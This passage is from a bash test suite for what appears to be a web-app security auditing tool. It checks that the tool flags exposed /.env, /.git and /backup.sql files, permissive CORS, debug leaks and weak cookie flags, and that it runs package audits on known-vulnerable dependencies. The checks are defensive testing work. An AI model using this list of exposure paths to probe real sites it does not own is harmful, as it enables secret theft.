      else FAIL=$((FAIL + 1)); echo "FAIL  live demo site: $1 (exit $rc)"; [[ "${VERBOSE:-0}" == "1" ]] && printf '%s\n' "$out" | sed 's/^/      | /'; fi
    }
    live "/.env is public"                 "/.env is public"
    live "/.git is public"                 "/.git/ is public"
    live "database dump is public"         "/backup.sql is public"
    live "trusts any website"              "trust ANY website, with cookies"
    live "stack traces on error pages"     "Error pages show stack traces"
    live "GraphQL introspection"           "GraphQL introspection is on at /graphql"
    live "source maps"                     "Source maps are public (app.js.map)"
    live "cookie flags"                    "Cookie 'sid' is missing: HttpOnly SameSite"
    live "TRACE method"                    "answers the TRACE method"
    live "missing headers"                 "No Content-Security-Policy header"
    if grep -qE 'demo-password-123|DEMOdemo' <<< "$out"; then FAIL=$((FAIL + 1)); echo "FAIL  live demo site: no secret values in the output"; else PASS=$((PASS + 1)); echo "ok    live demo site: no secret values in the output"; fi
  else
    echo "skip  live demo site (curl is not installed)"
  fi
fi


group "Display fixes found by the first real demo run"
# 1. The "run it as its own user" hint sits under the root finding, not under the next one.
BINS="srv-bad"; SYSROOT="$T/sys-bad"; ENVS=""
# shellcheck disable=SC2086
t "root and debugger findings (for the JSON)" 2 "Node process running as root" ""                                   $SRV --runner other --json "$T/disp1.json" p/s-app
SYSROOT=""; BINS=""
CHK="root hint is attached to the root finding"
chk node -e 'const r=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")); const g=(id)=>r.findings.find(x=>x.id===id); const root=g("SRV-NODE-ROOT"), dbg=g("SRV-NODE-INSPECT"); if(!root||!dbg) process.exit(1); const h="Run it as its own unprivileged user."; if(!root.details.some(d=>d.includes(h))) process.exit(1); if(dbg.details.some(d=>d.includes(h))) process.exit(1);' "$T/disp1.json"
# 2. A committed .env listed by line is not listed a second time without one.
proj disp2; put p/disp2/.env 'VITE_DB_PASSWORD=x'; put p/disp2/src/a.js 'const s = process.env.NEXT_PUBLIC_API_SECRET;'; gitify disp2
BINS="ok"
t "public variable in a committed .env"      2 ".env:1" ""                                                          --only code --json "$T/disp2.json" p/disp2
CHK=".env is listed once"
chk node -e 'const r=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")); const f=r.findings.find(x=>x.id==="CODE-PUBLIC-ENV"); if(!f) process.exit(1); const envs=f.details.filter(d=>d===".env"||d.startsWith(".env:")); if(envs.length!==1||envs[0]!==".env:1") process.exit(1); if(!f.details.includes("src/a.js:1")) process.exit(1);' "$T/disp2.json"
# 3. The same Node.js version, installed and running, is reported once.
printf '#!/bin/sh\necho %s\n' "$(node --version)" > fake-node-same; chmod +x fake-node-same
mkdir -p sys-same/proc/812; printf 'NODE_ENV=production\0' > sys-same/proc/812/environ
ln -s "$T/fake-node-same" sys-same/proc/812/exe; ln -s "$T/app-live" sys-same/proc/812/cwd
BINS="srv-best"; SYSROOT="$T/sys-same"
t "installed and running Node (for the JSON)" 0 "RESULT" ""                                                         --skip code --pm bun --server vps --proxy none --runner other --no-network --json "$T/disp3.json" p/clean
SYSROOT=""; BINS=""
CHK="the same Node.js version is reported once"
chk node -e 'const r=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")); const n=r.findings.filter(x=>x.id==="PKG-NODE-EOL"); if(n.length!==1||!n[0].message.includes("installed on this machine")) process.exit(1);' "$T/disp3.json"

# ====================================================== REAL AUDITS =======
if [[ "${RUN_NETWORK_TESTS:-0}" == "1" ]]; then
  group "Real audits (network)"
  for pm in npm pnpm yarn bun; do
    if ! PATH="$REAL_PATH" command -v "$pm" >/dev/null 2>&1; then echo "skip  real $pm audit ($pm not installed)"; continue; fi
    d="$T/real-$pm"; mkdir -p "$d"
    printf '{ "name": "real-%s", "version": "1.0.0", "private": true, "dependencies": { "lodash": "4.17.15", "minimist": "0.0.8" } }\n' "$pm" > "$d/package.json"
    (
      cd "$d" && export PATH="$REAL_PATH"
      case "$pm" in
        npm)  npm install --package-lock-only --ignore-scripts ;;
        pnpm) pnpm install --lockfile-only --ignore-scripts ;;
        yarn) yarn install --ignore-scripts ;;
        bun)  bun install --ignore-scripts ;;
      esac
    ) >/dev/null 2>&1
    out="$(cd "$T" && PATH="$REAL_PATH" bash "$SCRIPT" --only packages --pm "$pm" "$d" 2>&1 </dev/null)"; rc=$?
    if [[ "$rc" == "2" ]] && grep -qF "at or above 'critical'" <<< "$out" && grep -qF "minimist" <<< "$out"; then
      PASS=$((PASS + 1)); echo "ok    real $pm audit finds the known-vulnerable packages"
    else
      FAIL=$((FAIL + 1)); echo "FAIL  real $pm audit (exit $rc)"
      [[ "${VERBOSE:-0}" == "1" ]] && printf '%s\n' "$out" | sed 's/^/      | /'
    fi
  done
fi

if [[ "${RUN_NETWORK_TESTS:-0}" == "1" ]] && PATH="$REAL_PATH" command -v npm >/dev/null 2>&1; then
  d="$T/real-deep"; mkdir -p "$d"
  printf '{ "name": "real-deep", "version": "1.0.0", "private": true, "dependencies": { "request": "2.88.2", "left-pad": "1.3.0" } }\n' > "$d/package.json"
  ( cd "$d" && PATH="$REAL_PATH" npm install --package-lock-only --ignore-scripts ) >/dev/null 2>&1
  out="$(cd "$T" && PATH="$REAL_PATH" bash "$SCRIPT" --only packages --pm npm --deep --no-osv --no-tools "$d" 2>&1 </dev/null)"; rc=$?
  if grep -qF "Deprecated direct dependencies" <<< "$out" && grep -qF "request:" <<< "$out" && grep -qF "left-pad:" <<< "$out"; then
    PASS=$((PASS + 1)); echo "ok    real registry: deprecated packages are found"
  else
    FAIL=$((FAIL + 1)); echo "FAIL  real registry: deprecated packages are found (exit $rc)"
    [[ "${VERBOSE:-0}" == "1" ]] && printf '%s\n' "$out" | sed 's/^/      | /'
  fi
fi

echo
echo "$PASS passed, $FAIL failed"
[[ "$FAIL" -eq 0 ]]
